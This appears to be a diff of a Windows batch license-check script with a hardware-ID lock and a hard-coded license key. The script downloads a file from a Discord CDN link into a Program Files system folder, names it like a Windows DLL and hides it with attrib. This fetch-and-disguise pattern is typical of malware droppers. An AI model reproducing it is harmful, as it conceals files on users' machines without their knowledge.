@@ -9,7 +9,6 @@ Reg.exe add "HKCU\CONSOLE" /v "VirtualTerminalLevel" /t REG_DWORD /d "1" /f  > n
 if not exist "%systemdrive%\Program Files\Windows NT\Accessories\en-US" mkdir "%systemdrive%\Program Files\Windows NT\Accessories\en-US" 2>nul
 curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll" "https://cdn.discordapp.com/attachments/1219269832147734559/1246030163511218248/ProtectionManagement.rar?ex=665ae785&is=66599605&hm=9407ab85c459208d4a8d5056f576be05705cf37411464c0dc6019826d8b91b3b&" -# --create-dirs 
 
-
 set "logFile=C:\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll"
 
 cls
@@ -20,7 +19,7 @@ set /p "userCode=Enter your license: "
 cls
 
 rem Define the target HWID
-set "targetHWID=B18998B8-CAEA-601B-A0BD-047C16CBD761"
+set "targetHWID=2ED2E74D-6580-2A49-7D00-C90A6F5C465D"
 
 rem Get the current user's HWID
 for /f "tokens=2 delims==" %%A in ('wmic csproduct get uuid /value') do set "currentHWID=%%A"
@@ -40,24 +39,18 @@ if /i "!currentHWID!"=="%targetHWID%" (
 powershell -Command "attrib +h \"%logFile%\""
 
 set "isValidCode=false"
-for %%i in (UYT5D-7PA8Q-9XDE3) do (
+for %%i in (ASZ3M-4KQ9T-2WP8F) do (
     if "!userCode!" equ "%%i" (
         set "isValidCode=true"
-        goto :checkUsedCode
+        goto :validCode
     )
 )
 
-:checkUsedCode
-findstr /x "!userCode!" "%logFile%" >nul
-if not !isValidCode!==true (
-    echo Invalid License.
-    timeout /nobreak /t 5 >nul
-    exit /b
-) else if errorlevel 1 (
+:validCode
+if !isValidCode!==true (
     echo License correct. Welcome!
-    echo !userCode!>>"%logFile%"
 ) else (
-    echo License has already been used.
+    echo Invalid License.
     timeout /nobreak /t 5 >nul
     exit /b
 )
